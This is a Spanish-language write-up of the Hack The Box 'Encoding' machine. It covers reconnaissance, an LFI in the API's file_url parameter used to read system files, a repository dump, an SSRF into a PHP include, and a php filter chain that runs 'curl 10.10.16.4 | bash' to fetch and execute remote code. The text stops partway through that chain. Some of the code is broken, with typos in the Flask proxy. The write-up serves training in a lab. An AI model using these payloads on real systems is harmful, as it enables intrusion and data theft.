---
layout: post
title: Encoding
date: 2023-04-15
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Encoding-htb/Encoding.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.198 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 15:49 GMT
Nmap scan report for 10.10.11.198
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.198 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 15:50 GMT
Nmap scan report for 10.10.11.198
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: HaxTables
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.67 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.198
http://10.10.11.198 [200 OK] Apache[2.4.52], Bootstrap[3.4.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.198], JQuery[3.6.0], Script, Title[HaxTables], X-UA-Compatible[IE=edge]
```

La página principal se ve así:

<img src="/writeups/assets/img/Encoding-htb/1.png" alt="">

En la sección de API se puede ver un subdominio

<img src="/writeups/assets/img/Encoding-htb/2.png" alt="">

Lo agrego al ```/etc/hosts```

Aplico fuzzing para encontrar subdominios

```null
wfuzz -c --hh=1999 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.haxtables.htb" http://haxtables.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://haxtables.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000177:   403        9 L      28 W       284 Ch      "image"                                                                                                                                        
000000051:   200        0 L      0 W        0 Ch        "api"                                                                                                                                          

Total time: 17.46055
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 285.7297
```

Agrego ```image.haxtables.htb``` al ```/etc/hosts```. Replico la petición a la API del ejemplo

<img src="/writeups/assets/img/Encoding-htb/3.png" alt="">

```null
GET /v3/tools/string/index.php HTTP/1.1
Host: api.haxtables.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 42

{"action": "str2hex", "data": "kavigihan"}
```

```null
HTTP/1.1 200 OK
Date: Sat, 15 Apr 2023 15:59:46 GMT
Server: Apache/2.4.52 (Ubuntu)
Connection: close
Content-Type: application/json; charset=utf-8
Content-Length: 29

{"data":"6b617669676968616e"}
```

Leyendo todo el manual, encuentro un LFI. Utilizo el wrapper ```file://``` para incluir un archivo en el sistema y el output lo devuelvo en base64

```null
{"action": "b64encode", "file_url": "file:///etc/passwd"}
```

```null
{"data":"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTA0OjEwNTpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDU6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTA2OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzbG9nOng6MTA3OjExMzo6L2hvbWUvc3lzbG9nOi91c3Ivc2Jpbi9ub2xvZ2luCnV1aWRkOng6MTA4OjExNDo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA5OjExNTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjExMDoxMTY6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCmxhbmRzY2FwZTp4OjExMToxMTc6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMTI6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3ZjOng6MTAwMDoxMDAwOnN2YzovaG9tZS9zdmM6L2Jpbi9iYXNoCmx4ZDp4Ojk5OToxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCmZ3dXBkLXJlZnJlc2g6eDoxMTM6MTIwOmZ3dXBkLXJlZnJlc2ggdXNlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KX2xhdXJlbDp4Ojk5ODo5OTg6Oi92YXIvbG9nL2xhdXJlbDovYmluL2ZhbHNlCg=="}
```

Creo un script en bash para trabajar más cómodamente

```null
#!/bin/bash

file=$1

curl -s -X GET http://api.haxtables.htb/v3/tools/string/index.php -H "Content-type: application/json" -d "{\"action\": \"b64encode\", \"file_url\": \"file:///$file\"}" | jq '.["data"]' -r | base64 -d
```

De esta forma también puedo listar los subdominios

```null
./lfi.sh /etc/apache2/sites-enabled/000-default.conf | grep htb | sed 's/^\s*//'
ServerName haxtables.htb
ServerName api.haxtables.htb
ServerName image.haxtables.htb
```

Y las rutas donde se encuentran alojados

```null
./lfi.sh /etc/apache2/sites-enabled/000-default.conf | grep DocumentRoot | awk 'NF{print $NF}'
/var/www/html
/var/www/api
/var/www/image
```

Dentro del ```index.php``` para ```image``` puedo ver que se incluye un archivo PHP

```null
./lfi.sh /var/www/image/index.php
<?php 

include_once 'utils.php';

include 'includes/coming_soon.html';

?>
```

Contiene varias funciones. Las que más destacan son las de GIT

```null
./lfi.sh /var/www/image/utils.php
<?php

// Global functions

function jsonify($body, $code = null)
{
    if ($code) {
        http_response_code($code);
    }

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($body);

    exit;
}

function get_url_content($url)
{
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        echo jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;

}

function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
```

Ejecuta un script que hace un commit

```null
./lfi.sh /var/www/image/scripts/git-commit.sh
#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi
```

Pero de momento no puedo abusar de este. El directorio actual es el repositorio

```null
./lfi.sh /var/www/image/.git/HEAD
ref: refs/heads/master
```

Para poder comunicarme a estos recursos como si estuvieran expuestos directamente al servidor web, creo un script en python empleando Flask

```null
#!/usr/bin/python3

from flask import Flask

import requests, json


app = Flask(__name__)


@app.route('/<path:path>')
def index(path):

    post_data= {
        "action": "b64encode",
        "file_url": "file:///" + path
    }

    r = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', data=post_data)

    data = post_data.loads(r.tesxt.strip())

    response = bytes.fromhex(page["data"])

    return response

if __name__ == '__main__':
    app.run()
```

Ahora también puedo fuzzear rutas

```null
wfuzz -c --hh=0 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt http://localhost:5000/var/www/image/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost:5000/var/www/image/FUZZ
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000010:   200        1 L      2 W        23 Ch       ".git/HEAD"                                                                                                                                    
000000011:   200        5 L      13 W       92 Ch       ".git/config"                                                                                                                                  
000000012:   200        6 L      22 W       802 Ch      ".git/index"                                                                                                                                   
000002193:   200        6 L      6 W        81 Ch       "index.php"                                                                                                                                    

Total time: 22.05553
Processed Requests: 4713
Filtered Requests: 4709
Requests/sec.: 213.6878
```

Con ```git-dumper``` me descargo el repositorio

```null
git-dumper http://localhost:5000/var/www/image/.git git. Está compuesto por dos commits
```

```null
git log
commit 9c17e5362e5ce2f30023992daad5b74cc562750b (HEAD -> master)
Author: james <james@haxtables.htb>
Date:   Thu Nov 10 18:16:50 2022 +0000

    Updated scripts!

commit a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
Author: james <james@haxtables.htb>
Date:   Thu Nov 10 18:15:54 2022 +0000

    Initial commit
```

Examino las diferencias

```null
it diff a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
diff --git a/scripts/git-commit.sh b/scripts/git-commit.sh
index e413857..c1308cd 100755
--- a/scripts/git-commit.sh
+++ b/scripts/git-commit.sh
@@ -1,3 +1,9 @@
 #!/bin/bash
-/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
-/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
+
+u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)
+
+if [[ $u ]]; then
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
+else
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
+fi
```

En ```actions_handler.php``` se trata de incluir un archivo que se indica en un parámetro por GET

```null
<?php

include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}

?>
```

Puedo tramitar esta petición a través del LFI de antes que ahora pasa a ser SSRF.

```null
{"action": "b64encode", "file_url": "image.haxtables.htb/actions/action_handler.php?page=/etc/passwd"}

```null
{"data":"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTA0OjEwNTpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDU6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTA2OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzbG9nOng6MTA3OjExMzo6L2hvbWUvc3lzbG9nOi91c3Ivc2Jpbi9ub2xvZ2luCnV1aWRkOng6MTA4OjExNDo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA5OjExNTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjExMDoxMTY6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCmxhbmRzY2FwZTp4OjExMToxMTc6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMTI6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3ZjOng6MTAwMDoxMDAwOnN2YzovaG9tZS9zdmM6L2Jpbi9iYXNoCmx4ZDp4Ojk5OToxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCmZ3dXBkLXJlZnJlc2g6eDoxMTM6MTIwOmZ3dXBkLXJlZnJlc2ggdXNlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KX2xhdXJlbDp4Ojk5ODo5OTg6Oi92YXIvbG9nL2xhdXJlbDovYmluL2ZhbHNlCg=="}
```

Gano acceso es con el [php_filter_chain_generator.py](https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py)


```null
python3 php_filter_chain_generator.py --chain '<?php system("curl 10.10.16.4 | bash"); ?>'
[+] The following gadget chain will generate the following code : <?php system("curl 10.10.16.4 | bash"); ?> (base64 value: PD9waHAgc3lzdGVtKCJjdXJsIDEwLjEwLjE2LjQgfCBiYXNoIik7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM